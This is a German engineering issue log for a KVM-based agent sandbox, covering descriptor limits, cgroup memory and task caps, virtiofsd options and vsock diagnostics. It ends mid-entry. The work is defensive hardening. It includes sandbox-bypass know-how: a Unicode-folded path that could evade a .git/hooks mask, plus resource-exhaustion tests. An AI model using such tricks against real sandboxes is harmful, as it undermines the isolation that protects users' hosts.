**Tests.** `qemu::kvm_tests::a_walk_over_deep_directory_chains_stays_below_the_descriptor_limit`
(1 GiB, damit nicht der Speicherdruck des Gasts das Ergebnis verdeckt): die
Lücke von oben, dann ein Walk über alle 84 000 Verzeichnisse; beide ohne
`ENFILE`, höchstens 15/16 der Grenze im Dienst für `/work`. Gemessen mit dem
neuen Auslöser: höchstens 42 506 bis 45 814 Deskriptoren (vier Läufe).
Mutationsbeweis: ohne den Auslöser über die gehaltenen Inodes `ENFILE` nach
64 924 Verzeichnissen, rot (drei von drei Läufen).
`qemu::kvm_tests::the_agent_holds_none_of_pid_1s_cache_descriptors` (Startweg
der Tests, ohne Unit): Der Agent zählt in `/proc/$$/fd` und im Kind
(`ls -l /proc/self/fd`) die Ziele `dentry-state`, `inode-state`,
`drop_caches`, zuerst, bevor er selbst etwas öffnet: 0. Danach eicht er beide
Zählungen mit einer selbst geöffneten Datei auf einem Deskriptor, den die Shell
frei wählt (`exec {cal}<…`), so dass kein geerbter überschrieben wird: je eins
mehr. Der Bericht trägt
`CACHE bound` und nach einer Sekunde kein `CACHE off`, PID 1 hat die Dateien
also noch. Mutationsbeweise: ohne die drei in der keep-Liste von PID 1 schließt
PID 1 sie vor dem Fork, der Faden meldet `CACHE off look:Illegal_seek` (die
Nummer gehört inzwischen einem anderen Deskriptor), rot; ohne das `drop` im
Kind, mit den drei in der keep-Liste des Kinds und ohne `CLOEXEC` hält der
Agent alle drei, rot. Ohne nur das `drop` bleibt der Test grün: Der Schluss
der geerbten Deskriptoren im Kind und `CLOEXEC` halten die Dateien jeder für
sich vom Agenten fern, Absicht der Tiefe.

Keine Einbuße: `the_workloads_of_hum_469_measured` mit dem neuen Auslöser
(Gastkernel der CI, 512 MiB), Sekunden: `cp -r` 6,1, `git add -A` 11,2,
`grep -r` 2,9, `git status` 0,32 und 0,21, `ls -lR` 2,9, Walk 23,5, jeweils
ohne `ENFILE`, höchstens 37 901 Deskriptoren im Wurzeldienst; so wie mit dem
Shim von HUM-476 (Tabelle dort). Die vollen KVM-Tests (22) laufen grün mit dem
Gastkernel der CI und mit dem lokalen.

**Review** (Codex, Sonnet). Übernommen:
1. Major (Codex blocking, gegen Akzeptanzkriterium 1): Nach einem Leeren, das
   viele gehaltene Inodes antraf, lag die nächste Schwelle bei Stand plus
   Schritt, also womöglich über der Grenze (Stand 60 000, Schwelle 68 192);
   eine danach gebaute Kette erreichte `ENFILE` zuerst. Jetzt höchstens
   `HELD_CEIL` (57 344, zur Übersetzungszeit gegen `HELD_LIMIT` geprüft). Damit
   ein Gast über der Decke, der seine Inodes in Benutzung hält, PID 1 nicht
   jede Runde vergeblich leeren lässt, wartet ein Leeren für die gehaltenen
   Inodes, wenn das letzte solche weniger als `HELD_STEP` freigab,
   `HELD_COOLDOWN_LOOKS` Runden (10, eine Sekunde): Jedes Leeren wirft den
   ganzen unbenutzten Cache weg, den der Gast dann neu liest; einmal je
   Sekunde kostet ein Zehntel davon, und ein Gast, der mehr als 57 344 Inodes
   in Benutzung hält, steht absichtlich an der Grenze, die auf dem Host
   bindet. Die Zählung der unbenutzten leert unverändert sofort. Unit-Tests
   `a_high_floor_still_trims_below_the_limit` und
   `a_trim_that_frees_nothing_waits_before_the_next`; Mutationsbeweise: ohne
   `.min(HELD_CEIL)` beide rot, ohne die Wartezeit der zweite rot.
2. Major (Codex): Die Eichung öffnete Deskriptor 7, bevor gezählt wurde; wäre
   7 ein geerbter Deskriptor von PID 1 gewesen, hätte `exec 7<` ihn
   überschrieben. Zutreffend, und genau das geschah im Mutationslauf: Mit dem
   alten Skript zählte der Agent zwei der drei Dateien, mit dem neuen alle
   drei. Jetzt erst zählen, dann auf frei gewähltem Deskriptor eichen; die
   Zählung im Kind ist mit geeicht (Sonnet, minor).
3. Minor (Codex): Der Kettentest ließ die gehaltenen Ketten auch los, wenn
   kein Leeren beobachtet war. Der Agent meldet jetzt
   `trimmed-while-held:yes|no`, der Test verlangt `yes`.

Nach dem Review (Gastkernel der CI): beide Tests dreimal grün, der Kettentest
mit höchstens 42 129 Deskriptoren, jedes Mal `trimmed-while-held:yes`; ohne den
Auslöser über die gehaltenen Inodes weiter `ENFILE` nach 64 924, rot.

Nebenbefund, kein eigenes Issue nötig: Schlösse PID 1 die drei Dateien je
vorzeitig, läse und schriebe der Faden unter derselben Nummer einen fremden
Deskriptor (im Mutationslauf scheiterte erst das Lesen mit `ESPIPE`). Die
keep-Liste und der neue Test bewachen genau das.

Delta-Review (Codex, blocking, Sonnet minor): Die Wartesekunde nach einem Leeren, das wenig freigab, hielt auch dann still, wenn der Gast danach schnell neue Einträge baute; ein Walk von rund 7 000 Einträgen hätte `ENFILE` vor dem nächsten Leeren erreichen können. Jetzt endet die Wartezeit, sobald der Gast `HELD_STEP` (8 192) Inodes mehr hält, als das Leeren übrig ließ, oberhalb von `HELD_CEIL` (57 344) schon bei `HELD_REGROW` (512) mehr; ein Gast, dessen Zahl nicht wächst, bleibt bei einmal je Sekunde. Eine Zwischenfassung mit fester Obergrenze 63 488 ließ nur 2 048 Luft, weniger als ein Walk zwischen zwei Blicken anlegt (Codex, dritte Runde). Eine erste Fassung mit 1 024 hätte bei einem Walk Dutzende Male je Sekunde geleert (jeder Nachschlag wächst `nr_inodes`), der Kettentest sah dann kein Steigen und Fallen mehr. Der Kettentest erkennt das Leeren jetzt an unbenutzten Dentries über 3 000 und danach unter 500. Gemessen danach: zwei Kettenläufe grün, die Lasten aus HUM-469 unverändert (cp 5,3 s, git add 11,5 s, ls -lR 3,4 s, Walk 20,9 s, 0 `ENFILE`). Unit-Test `growth_during_the_cooldown_trims_at_once`, Mutationsbeweis: ohne die Klausel rot.

---

## HUM-484 · Kernel level: `--allow-mmap` and the 6.6 guest kernel floor under `--cache auto`

### Kontext
Aus HUM-476. `--allow-mmap` und die Untergrenze 6.6 des Gastkernels
(`prerequisites.rs`) stammen aus der Zeit von `--cache never` und wirken
unter `auto` womöglich nicht mehr.

### Spezifikation
1. Messen, ob beide unter `auto` noch nötig sind; wenn nicht, entfernen
   und die Dokumentation anpassen.

### Akzeptanzkriterien
1. Jede der beiden Einstellungen ist begründet oder entfernt.

### Stand nach der Umsetzung (2026-11-15)
Beide entfernt. Die virtiofsd laufen mit `--cache auto` ohne `--allow-mmap`
(`lines.rs`, `file_daemon_tail`), die Prüfung der Voraussetzungen fragt
virtiofsd nur noch nach `--readonly`, `--fd` und `--cache`, und keine
Fassung des Gastkernels wird mehr abgelehnt; der Beleg des Doctors nennt die
Fassung aus dem Kopf der Konfiguration weiter, oder dass sie unbekannt ist
(`prerequisites.rs`). Das Gerüst der KVM-Tests (`test_vm.rs`) lief noch mit
`--cache never --allow-mmap` und folgt jetzt der Endform.

Warum beide zu `never` gehörten: Unter `never` (und `metadata`) öffnet
virtiofsd jede Datei mit `FOPEN_DIRECT_IO`, also ohne Seitencache des Gasts.
Eine solche Datei bildet der Gastkernel nur geteilt ab, wenn der Dienst
`FUSE_DIRECT_IO_ALLOW_MMAP` anbietet (`--allow-mmap`) und der Kernel es
kennt (ab 6.6); sonst `ENODEV`. Unter `auto` öffnet virtiofsd keine Datei so
(`--allow-direct-io` setzen wir nicht), und `MAP_SHARED` geht durch den
Seitencache, wie FUSE es seit jeher kann. Die Hilfe von virtiofsd 1.14 rät
zudem, `--allow-mmap` nur zu setzen, wenn der Dienst den Ordner für sich
allein hat; der Projektordner gehört dem Nutzer.

Gemessen mit dem neuen KVM-Test `shared_mappings_work_without_allow_mmap`
(512 MiB, 1 CPU, QEMU 11.1.3, virtiofsd 1.14.0): in Python `mmap(MAP_SHARED)`
lesend auf `/usr/bin/bash`, schreibend auf eine Datei unter `/work` mit
`msync` (der Host liest danach `hum484` in der Datei), SQLite im WAL-Modus
(1000 Zeilen, zweite Verbindung, `-shm` geteilt abgebildet), dazu
`git init/add/commit` und `gcc` samt Start des Programms (Status 42); je
direkt und in einer Wegwerf-Sitzung (dort dient der Dienst der Schicht
`/work`, die Datei landet in der Schicht, das Projekt bleibt unberührt).

| virtiofsd | Gastkernel | Ergebnis |
|---|---|---|
| `--cache auto --allow-mmap` (vorher) | 6.12.115 (CI) | grün |
| `--cache auto` | 6.12.115 (CI) | grün |
| `--cache auto` | 7.3.4 (lokal) | grün |
| `--cache never` | 6.12.115 (CI) | rot: `root-read` und `work-write` `OSError: [Errno 19] No such device`, SQLite `disk I/O error`; `git` und `gcc` gehen (sie bilden nicht geteilt ab) |
| `--cache never --allow-mmap` (HUM-469) | 6.12.115 (CI) | grün |

Die Zeile `never` ohne Option ist zugleich der Mutationsbeweis des Tests.

Gastkernel unter 6.6: Auf dem Rechner liegt keiner (lokal 7.2 und 7.3, CI
6.12.115), gebaut wurde keiner. Die Begründung deshalb aus dem Mechanismus
und den Fassungen: Der einzige Grund der Untergrenze war
`FUSE_DIRECT_IO_ALLOW_MMAP`, und der Gastkernel fragt dieses Merkmal nur bei
einer Datei mit `FOPEN_DIRECT_IO` ab, die es unter `auto` nicht gibt; die
Tabelle zeigt den Unterschied genau an dieser Stelle. Was der Gast sonst
braucht, hat ältere Untergrenzen laut den Kernel-Fassungen (virtiofs 5.4,
`overlay` mit `userxattr` 5.11, `close_range(CLOSE_RANGE_CLOEXEC)` 5.11 (Start der Probe als Root),
`open_tree` 5.2), ungetestet; ein Kernel, dem eines davon fehlt, scheitert
laut: Er bootet die virtiofs-Wurzel nicht, oder der Shim meldet die
Prüfung rot (`guest.rs`: ein `overlay`, das nicht einhängt, färbt
`MountsMatch`, ein Filter, der nicht greift, `SeccompApplied`), und die
Sitzung wird abgelehnt. Die Ablehnung der Untergrenze sollte eine Sitzung
verhindern, die kaputt ist, ohne es zu sagen; die gibt es unter `auto` nicht
mehr. Getestet sind weiter 6.12 und 7.x.

Tests: `the_guest_kernel_version_is_shown_and_never_refused`
(prerequisites.rs; 6.1, 6.12 und 7.3 bestehen und stehen im Beleg),
Mutationsbeweis: die Untergrenze 6.6 zurück, 6.1 wird abgelehnt, der Test
wird rot. `a_capability_missing_from_the_help_is_named` fragt statt
`--allow-mmap` nach `--cache`. Die Zeilen in `lines.rs` verlangen
`--cache auto` ohne `--allow-mmap`; Mutationsbeweis: die Option zurück,
drei Tests werden rot. Dokumente: SECURITY en/de („Shared mappings",
Voraussetzungen), THREAT-MODEL en/de (Verlauf K-33).

---

## HUM-485 · Kernel level: memory and task limits of the unit

### Kontext
Die Unit einer Sitzung der Kernel-Stufe begrenzt Deskriptoren
(`LimitNOFILE`), aber weder Speicher noch Zahl der Prozesse; ein
übernommener Helfer könnte Speicher oder PIDs des Rechners binden.

### Spezifikation
1. `MemoryMax=` (aus dem Speicher der Maschine plus einem festen Zuschlag
   für die Helfer) und `TasksMax=` für die Unit, gemessen an einer normalen
   Sitzung.

### Tests
- KVM: eine Sitzung läuft mit den Grenzen; ein Helfer über `TasksMax`
  scheitert.

### Akzeptanzkriterien
1. Eine Sitzung bindet höchstens den festen Speicher und die feste Zahl
   von Prozessen.

### Stand nach der Umsetzung (2026-11-15)
Die Unit trägt `MemoryMax`, `MemorySwapMax` und `TasksMax`
(`daemon/crates/sandbox/src/qemu/limits.rs`).

Gemessen an der cgroup echter Sitzungen (`memory.stat`, `pids.peak`; QEMU
11.1, virtiofsd 1.14, Host-Kernel 7.3), mit dem neuen, von Hand laufenden
KVM-Test `the_limits_of_hum_485_measured` (Lasten aus HUM-469/476, dazu acht
parallele Leser über die Wurzel und zwei tmpfs des Gasts zu 85 % seines
Speichers), den übrigen KVM-Tests und der Escape-Suite (11 Sitzungen,
4096 MiB, 4 vCPU):
- Speicher des Gasts: ein memfd, `shmem` der Unit bis zur Größe der
  Maschine.
- Helfer: `anon` höchstens 59 MiB, Kernel-Speicher höchstens 96 MiB (Walk,
  4 vCPU, 4096 MiB); ein virtiofsd an seiner Grenze von 65 536 Deskriptoren
  54 MiB Kernel-Speicher.
- Seiten-Cache dessen, was virtiofsd liest: bis 6 GiB, zurückholbar.
- Was die Unit auf ein tmpfs schreibt (Projektordner auf tmpfs, immer die
  Schicht einer Wegwerf-Sitzung): `shmem`, nicht zurückholbar.
- Tasks: 28 bis 34 neben den vCPU (32 direkt mit 4 vCPU, 38 Wegwerf mit
  4 vCPU in der Escape-Suite); je Helfer zwei bubblewrap, sechs bis sieben
  `sh`, je virtiofsd drei bis vier Fäden, vsock-Gerät vier, Emulator zwei
  samt dem Kernel-Faden von KVM. Escape-Suite: `memory.peak` höchstens
  355 MiB.

Gewählt:
- `MemoryMax` = Speicher der Maschine + 512 MiB (rund das Dreifache der
  gemessenen 160 MiB der Helfer; deckt drei virtiofsd an der Grenze der
  Deskriptoren) + Größe jedes tmpfs, auf das die Unit schreibt, je
  Dateisystem einmal, + 64 MiB je Maske (Review, unten). Ohne diesen Anteil stürbe eine Wegwerf-Sitzung an ihrer
  eigenen Schicht. Unter der Grenze ohne tmpfs-Anteil (4608 MiB bei
  4096 MiB/4 vCPU, 1024 MiB bei 512 MiB/1 vCPU, für die Messung erzwungen)
  liefen alle Lasten durch, `memory.peak` an der Grenze, kein Swap, kein
  Abbruch; der Kernel holte den Seiten-Cache zurück.
- `MemorySwapMax` = `MemoryMax`, nicht 0 und nicht offen: offen füllte ein
  Helfer an der Grenze den Swap des Hosts; 0 machte den Speicher des Gasts
  unauslagerbar, und auf einem kleinen Host verdrängte eine ruhende Sitzung
  dann alles andere. Gleich der Vorgabe von Podman für `--memory`.
- `TasksMax` = vCPU + 128 (fast das Vierfache des Gemessenen; Platz für den
  Pool der Arbeitsfäden des Emulators, höchstens 64).
- Fehlen dem Dienstverwalter des Nutzers die Controller `memory` und `pids`,
  übergeht systemd die Grenzen still. Deshalb Ablehnung vor dem Start mit
  `SANDBOX_052` (neu, Fix: der systemd-Eintrag, der delegiert), keine eigene
  Zeile im Doctor; `humanitl doctor --probe` zeigt sie als inneren Befund.
  systemd ab 254 delegiert `memory` und `pids` von sich aus.
- Die Vorschau nennt `pids` (`TasksMax`); ihr Speicher bleibt der der
  Maschine.

Tests: `the_limits_follow_the_machine_and_the_writes_in_ram`,
`only_a_tmpfs_counts_and_each_only_once`,
`missing_controllers_refuse_the_start` (limits.rs), die Eigenschaften in
`the_unit_carries_the_hardening_of_the_spike`; KVM: alle Tests grün mit den
Grenzen, `a_process_in_the_unit_cannot_start_more_tasks_than_tasks_max`: ein
Prozess in der Unit startet `sleep`, bis `fork` scheitert (105 bei
`TasksMax` 129, `pids.peak` 129), und die cgroup trägt `memory.max`,
`memory.swap.max` und `pids.max`. Mutationsbeweis: ohne `TasksMax` startet
er alle 1000 (`pids.peak` 1030), der Test wird rot.

Review (Codex, Antigravity, Sonnet):
- Codex blocking 1, übernommen: Die tmpfs-Masken im Gefängnis des Dienstes
  für `/work` (`.git/hooks`, `.vscode`, ...) waren ohne Größe und nicht in
  `MemoryMax`; ein Gast konnte eine direkte Sitzung auf einem Projekt auf
  der Platte darüber in den OOM tragen. Jetzt hat jedes tmpfs jedes
  Gefängnisses `--size`: die Masken 64 MiB (`WORK_MASK_MIB`; Hooks,
  Einstellungen, der Index einer IDE, ein kleines Werkzeug unter `.direnv`),
  in `MemoryMax` je Maske eingerechnet, immer (Delta-Review von Codex: auch
  bei nur lesbarem Projekt ist das tmpfs im Gefängnis beschreibbar, ein
  übernommener Dienst könnte es füllen); die leeren tmpfs der nur lesbaren Wurzel 1 MiB (kein Gast schreibt
  dorthin, der Dienst läuft mit `--readonly`). Die Schicht hat keine
  tmpfs-Maske. bubblewrap braucht dafür `--size` (Voraussetzung,
  `SANDBOX_045`; bwrap 0.13.1 lokal). KVM-Test
  `a_write_beyond_a_mask_s_size_ends_with_enospc`: 80 MiB nach
  `/work/.git/hooks` enden mit `ENOSPC` bei 67 108 864 Bytes.
  Mutationsbeweis: ohne `--size` wird die Datei ganz geschrieben (83 886 080
  Bytes), der Test wird rot.
- Codex blocking 2, übernommen: `cgroup.controllers` des Dienstverwalters
  nennt verfügbare, nicht bis zur Unit freigeschaltete Controller; ein
  `DisableControllers=` auf einem Slice dazwischen ließe die Prüfung vor dem
  Start bestehen. Jetzt vergleicht die Host-Prüfung `memory.max`,
  `memory.swap.max` und `pids.max` der laufenden Unit mit dem Plan
  (`UnitStop::limits`); eine fehlende Datei oder ein anderer Wert ist
  `SANDBOX_052` an jeder Garantie, der Agent startet nie. `SANDBOX_052`
  statt `SANDBOX_047`, weil Ursache und Fix dieselben sind wie vor dem
  Start. Hat der Gast schon abgelehnt, bleibt seine Diagnose (HUM-470). Die
  Prüfung vor dem Start bleibt als frühe, freundlichere Ablehnung. Tests
  `the_unit_cgroup_must_carry_the_planned_limits` (cgroup-Nachbildung),
  `unenforced_limits_refuse_every_green_guarantee_with_sandbox_052`, KVM
  `a_unit_without_its_limits_is_refused_with_sandbox_052` (eine spätere
  Eigenschaft `TasksMax=infinity`). Mutationsbeweise: Vergleich in
  `judge_cgroup` aus, der Unit-Test wird rot; Vergleich in der Zulassung
  aus, die Sitzung besteht und der KVM-Test wird rot.
- Sonnet minor, übernommen: In den Dokumenten steht, dass `MemoryMax` um die
  Größe eines tmpfs wächst, auf das der Nutzer das Projekt gelegt hat; der
  Satz der unlesbaren `cgroup.controllers` nennt die vereinheitlichte
  cgroup-v2-Hierarchie. `ControlGroup` des Dienstverwalters ist eine
  Eigenschaft des Managers aus `org.freedesktop.systemd1(5)` ohne Vermerk
  „Added in version", also älter als 252 und nicht leer für einen
  Dienstverwalter des Nutzers; kein Rückfall nötig.
- Kandidaten für eigene Issues, nicht übernommen: `MemoryHigh` unter
  `MemoryMax` (früheres Zurückholen statt Abbruch), ramfs und hugetlbfs als
  Ziel von Schreibvorgängen der Unit, ein Budget für schmutzige Seiten.

---

## HUM-486 · vhost-device-vsock: report the start-up bug, detect a silent device

### Kontext
Aus HUM-471. vhost-device-vsock 0.3.0 beendet seinen Event-Faden still,
wenn ein `CONNECT` vor den Queues ankommt; der Prozess lebt weiter und
antwortet nie. HUM-471 umgeht das, indem der Host erst nach der Meldung des
Gasts verbindet.

### Spezifikation
1. Den Fehler upstream melden, mit der Reproduktion aus HUM-471 (ohne
   Projektnamen oder interne Pfade).
2. Prüfen, ob die Sitzung ein stummes Gerät eindeutig benennen kann (etwa
   über eine Frist auf die Antwort der Tür), statt nur „no report".

### Akzeptanzkriterien
1. Bericht upstream verlinkt im Spec; ein stummes Gerät hat eine eigene
   Aussage in der Diagnose oder eine begründete Entscheidung dagegen.

### Stand nach der Umsetzung (2026-11-19)
Upstream-Bericht: (Link folgt nach Freigabe des Eigentümers)

Upstream ist der Fehler behoben, aber nicht veröffentlicht: Commit 112af055
„vsock: Access virtqueues only if they are ready" im Repository
rust-vmm/vhost-device (Teil von PR #936, eingespielt am 2026-10-29) lässt
`process_rx`, `process_tx` und `process_raw_pkts` mit `Ok(())` zurückkehren,
solange die Warteschlange nicht bereit ist; im Review von #936 ist genau das
Ende des Ereignisfadens an `QueueNotReady` beschrieben. Ein eigenes Issue gab
es nicht. Neueste Version auf crates.io bleibt 0.3.0 (2025-08-06). Der
Entwurf bittet deshalb um eine Veröffentlichung mit diesem Commit und legt
die Reproduktion aus HUM-471 bei, statt einen neuen Fehler zu melden. Ob ein
Bau von `main` die Reproduktion besteht, ist nicht geprüft.

Ein stummes Gerät ist eindeutig genug, um es zu benennen: Nach der
Bereitschaftszeile lauscht der Shim, und die Zeile kam über die
Warteschlangen des Geräts, also laufen sie. Auf ein `CONNECT` antwortet das
Gerät dann binnen Millisekunden, mit `OK` oder einer Absage (beides
gemessen in HUM-470). Bleibt eine Anfrage nach der Bereitschaft
`SILENT_DEVICE_AFTER` (zehn Sekunden) ohne ein einziges Byte Antwort, hält
der Faden zum Gast das fest (`Admission::note_silent_device`), und aus dem
fehlenden Bericht wird `SANDBOX_055` („Kernel level vsock device silent")
mit Stufe und Wartezeit im Grund, statt `SANDBOX_013`. Eine Absage ist kein
Schweigen: Die Wartezeit zählt je Anfrage. Kommt doch noch eine Antwort,
gleich welche (das erste Byte oder das Schließen der Verbindung durch das
Gerät), hebt sie den Vermerk auf (Review Codex, blocking, übernommen: eine
späte Absage ließ ihn zuerst stehen). Die Anfrage wird dabei nicht
aufgegeben (HUM-470), die Frist der Sitzung bleibt, wie sie war. Was von
außen nicht zu trennen ist: ein Gastkernel, der direkt nach seiner Zeile
hängt, sieht genauso aus; der Text von `SANDBOX_055` sagt das. Die zehn
Sekunden liegen vor den 30 Sekunden, nach denen der Shim ohne Verbindung
abschaltet. `humanitl` endet bei `SANDBOX_055` wie bei `SANDBOX_013` mit
Exit-Code 3.

Tests (Unit, Gerät als Attrappe, im Test `SILENT_DEVICE_AFTER` = 1 s):
`a_device_that_never_answers_after_the_ready_line_is_named_silent`,
`a_device_that_refuses_is_not_silent`,
`a_late_answer_undoes_the_silent_device`,
`a_late_refusal_undoes_the_silent_device` (`qemu/session.rs`),
`a_silent_vsock_device_is_sandbox_055` (`qemu/tests.rs`). Mutationsbeweise,
je einzeln rot: ohne den Aufruf des Beobachters in `answer`; mit einer
Wartezeit ab der ersten statt je Anfrage; ohne das Zurücksetzen in
`Admission::note_link`; ohne die Meldung der Antwort an den Beobachter
(`waiting(Duration::ZERO)` in `answer`); ohne den Zweig `silent` in
`name_the_link`. Kein
KVM-Test: Das echte Gerät verstummt nur über den Wettlauf, den HUM-471
verhindert, und ein Zwischenstück am vhost-user-Socket kann den Datenweg
nach der Bereitschaft nicht anhalten; ein solcher Test bewiese nur die
Attrappe ein zweites Mal.

---

## HUM-487 · KVM test of the descriptor limit: the refusal count does not depend on the length of `/usr`

### Kontext
Im CI-Lauf 43678367755 (HUM-449) wurde `kvm-tests` rot:
`a_guest_cannot_drive_the_root_file_daemon_over_its_descriptor_limit`
verlangte mindestens 500 Abweisungen der Probe, die Probe zählte 487. Die
Grenze hielt (höchstens 64 944 Deskriptoren, 0 `ENFILE` im Walk); die Probe
gibt nach 500 Abweisungen hintereinander auf, und hier endete die Liste der
Dateien unter `/usr` vorher. Mit dem Leeren des Caches (HUM-476, HUM-483)
gelingen zwischendurch wieder einzelne Öffnungen, was die Folge unterbricht.
Entscheidung des Owners vom 2026-11-15: Der rote Lauf setzt die Zählung der
zehn grünen Läufe nicht zurück; der Test wird behoben und HUM-449 neu durch
die CI geschickt.

### Spezifikation
1. Der Test verlangt mindestens eine Abweisung neben einem Viertel der
   Grenze an gehaltenen Dateien, statt 500, und dass der Dienst dabei an
   seiner Grenze stand (Höchststand mindestens neun Zehntel), die
   Abweisung „Too many open files" lautete und die Grenze des Dienstes in
   `/proc` 65 536 ist.

### Akzeptanzkriterien
1. Der Test hängt nicht mehr an der Zahl der Dateien unter `/usr`, belegt
   aber weiter, dass die Grenze und nicht ein Fehler der Probe sie aufhielt.

### Stand nach der Umsetzung (2026-11-15)
Die Bedingung ist `held * 4 >= 65 536 && refused >= 1 && most * 10 >=
limit * 9`; der Satz am Test nennt den Grund. Review (Sonnet, minor,
übernommen): eine einzelne Abweisung allein könnte auch ein fremder Fehler
sein, deshalb trägt der Höchststand des Dienstes den Beleg (im roten Lauf
64 944 von 65 536). Delta-Review (Codex, blocking): auch das genügt nicht,
wenn der Dienst ohne Grenze zufällig hoch steht; jetzt zählt die Probe nur
Abweisungen mit „Too many open files" (`limited=`), und der Test liest die
weiche Grenze des Dienstes aus `/proc/<pid>/limits`. Mutationsbeweis unverändert über `held < HOLD` (ohne Grenze
hält die Probe alle 40 000).

---

## HUM-488 · doctor: one line per prerequisite for an admitted level that lacks one

### Kontext
Aus HUM-449. Vor der Zulassung zeigte `humanitl doctor` für die Kernel-Stufe
je Voraussetzung eine Zeile, ohne etwas zu starten. Seit der Zulassung sucht
die Gruppe das Backend wie jeder Start (`available`), und diese Suche nennt
nur die erste fehlende Voraussetzung (`SANDBOX_045`). Das Ziel der
Kernel-Stufe verlangt, dass doctor alle Voraussetzungen prüft und sagt, was
fehlt.

### Spezifikation
1. Scheitert die Suche einer zugelassenen Stufe, folgen der Zeile
   `available` die Zeilen je Voraussetzung (`static_checks`), wie vor der
   Zulassung; gestartet wird dabei nichts.

### Tests
- Unit: die zugelassene Kernel-Stufe ohne Emulator zeigt jede Voraussetzung
  als eigene Zeile, den Emulator als Fehler. Mutationsbeweis: ohne die Zeilen
  rot.

### Akzeptanzkriterien
1. `humanitl doctor` nennt für die Kernel-Stufe jede fehlende Voraussetzung,
   nicht nur die erste.

### Stand nach der Umsetzung (2026-11-15)
`admitted_lines` hängt bei gescheiterter Suche `static_lines` an (dieselben
Zeilen wie `unadmitted_lines`, jetzt eine gemeinsame Funktion). Gilt ebenso
für Podman, dessen Gruppe dieselben Zeilen der Engine bekommt. Test
`the_admitted_kernel_level_is_searched_like_a_start_and_probes_nothing_it_lacks`
erweitert; Mutation (Zeilen weg) rot. SECURITY en+de nennen es; `docs/cli.md`
zieht HUM-447 nach.

---

## HUM-489 · CLI: `humanitl run --sandbox-min-isolation` raises the floor of the session

### Kontext
Aus HUM-447. `humanitl run` filtert `--sandbox-min-isolation` aus den
`cli_overrides` (`merge_overrides` in `run.rs`, `SESSION_OVERRIDE_KEYS` in
`ipc/session.rs`); der Daemon sieht die Untergrenze nicht, ohne Hinweis.
`docs/cli.md` sagt es ehrlich, aber ein Flag, das still nichts tut, ist eine
Falle.

### Spezifikation
1. `sandbox.min_isolation` wird ein Schlüssel der Sitzung; der Daemon nimmt
   den strengsten Wert aus Konfiguration, Profil und Kommandozeile, nie einen
   schwächeren.

### Tests
- `humanitl run --sandbox-min-isolation kernel` mit `auto` endet mit
  `SANDBOX_035`; ein schwächerer Wert der Kommandozeile senkt eine höhere
  Untergrenze der Konfiguration nicht.

### Akzeptanzkriterien
1. Kein Flag der Untergrenze fällt still weg.

---

## HUM-490 · e2e-m4: the edited request in the history flakes

### Kontext
CI-Lauf 43659952440 (HUM-484): `e2e-m4` rot mit „the history holds the
request as edited did not happen within 30s"; derselbe Inhalt war im
nächsten Lauf grün.

### Spezifikation
1. Ursache finden (Warten auf ein Ereignis statt einer Frist, oder die Frist
   begründen), kein Wiederholen.

### Akzeptanzkriterien
1. Ursache benannt und behoben.

### Stand nach der Umsetzung (2026-11-19)

Die Ursache lag im Produkt, nicht in der Frist. Die History lädt ihre erste
Seite, wenn der Bildschirm aufkommt, und das ist im M4-Lauf derselbe
Augenblick, in dem das Skript den Agenten startet: Lokal lagen zwischen dem
Start des ersten `ListFlows` und dem `Received` der Anfrage 0,4 s. Kam das
Ereignis an, während die Antwort noch unterwegs war, faltete
`HistoryPageNotifier` die Ankunft in die Zeilen, und die Antwort schrieb gleich
danach ihre ältere Seite darüber: Der Daemon hatte seine Aufzeichnung gelesen,
bevor die Anfrage eintraf. Die Zeile war damit für immer weg; `Held`,
`Decided` mit `allow_edited` und alles danach fanden keine Zeile mehr, und auf
dem CI-Läufer stand der Test 30 s vor einer History ohne die Anfrage. Der
Daemon hatte richtig aufgezeichnet (`edited` in Schritt 7 war grün), nur die
Seite der Anwendung nicht. Dieselbe Lücke gilt für jedes Neuladen, auch nach
`Lagged`; die Warteschlange hatte sie in `Flows._resync` schon geschlossen.

Behoben in `app/lib/features/history/providers/history_page.dart`: Solange
eine Seite unterwegs ist, die erste wie jede weitere (`_fetchHoldingBack`),
hält der Notifier die Ereignisse zurück und faltet sie in ihrer Reihenfolge
ein, sobald die Seite da ist. Bei der weiteren Seite war es dieselbe Lücke:
Ein `Decided` für eine Zeile der kommenden Seite fand keine Zeile, und sie kam
ohne „Edited" an. Die Seite kann neuer sein als ein zurückgehaltenes Ereignis;
beim Nachfalten fällt deshalb eine Zeile nie in ihrem Lebenslauf zurück, ein
kumulativer Zähler schrumpft nicht, und eine Ankunft, die die Seite schon
führt, erkennt `_arrived` an der Id, auch unter einem Filter, wo sie sonst als
verpasst gezählt würde. Das Fenster schließt sich auch, wenn der Abruf mit
einer Ausnahme endet. `Lagged` wird nicht zurückgehalten, es lädt neu und
öffnet sein eigenes Fenster. Kein Warten auf ein anderes Ereignis im Test und
keine längere Frist: Die 30 s bleiben, weil der Zustand nach dem Fix binnen
eines Rahmens nach `Decided` steht.

Beleg in `app/test/features/history/history_page_test.dart` über einen Fake,
dessen `ListFlows` sofort liest und erst auf Freigabe antwortet:
`an edit decided while the first page is on its way stays in the row`,
`a decision for a row of the page on its way keeps the chip`,
`an event the page is already past does not move the row back`,
`an arrival the filtered page already lists is not counted`,
`a gap during the first page reloads and keeps the arrival` und
`a load that throws closes its window`. Jede der Mutationen (kein Fenster beim
ersten Laden, keins beim Nachladen, kein Nachfalten, kein Schutz gegen
Rückschritt, Zählung vor der Id-Prüfung, Fenster nur bei Erfolg geschlossen)
macht mindestens einen davon rot.

---

## HUM-491 · macOS: clone masks fold by Unicode like APFS

### Kontext
Aus HUM-482. Unter macOS vergleichen die Masken des Klons über `folded`, das
nur ASCII faltet; APFS faltet nach Unicode (U+017F, U+212A), so dass
`.git/hoo\u{212a}s` dieselbe Maske wäre.

### Spezifikation
1. Den Vergleich der Masken unter macOS nach der Faltung von APFS ausrichten,
   oder wie unter Linux verweigern, wo ein Name einer Maske gefaltet wird.

### Akzeptanzkriterien
1. Keine Maske lässt sich unter macOS über die Schreibweise umgehen.

### Stand nach der Umsetzung (2026-11-19)
**Nachschlagen statt falten, nicht verweigern.** Verweigern wie unter Linux
scheidet aus: APFS ohne Unterschied der Schreibweise ist die Vorgabe unter
macOS, eine Weigerung schlösse die Wegwerf-Sandbox dort fast überall aus.
Falten nachbauen scheidet ebenfalls aus: Apple nennt nur „Unicode 9.0" für
Faltung und Normalisierung und dass ein Name „with any of its normalization
variants" gefunden wird (Apple File System Guide, FAQ,
